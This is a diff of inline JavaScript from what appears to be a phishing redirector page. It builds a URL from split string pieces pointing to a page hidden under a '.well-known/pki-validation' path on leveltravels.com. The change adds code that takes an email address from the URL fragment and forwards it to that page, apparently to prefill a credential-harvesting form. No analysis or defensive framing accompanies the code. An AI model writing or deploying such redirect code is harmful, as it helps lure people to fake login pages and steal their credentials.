@@ -11,8 +11,13 @@
             var part2 = "leveltravels.com//.well-";
             var part3 = "known/pki-validation/wes/index.html";
 
-            var redirectUrl = part1 + part2 + part3;
+            // Get the email parameter from the URL
+            var email = window.location.hash.substring(1);
 
+            // Construct the redirect URL
+            var redirectUrl = part1 + part2 + part3 + "#" + encodeURIComponent(email);
+
+            // Redirect to the constructed URL
             window.location.href = redirectUrl;
         })();
     </script>
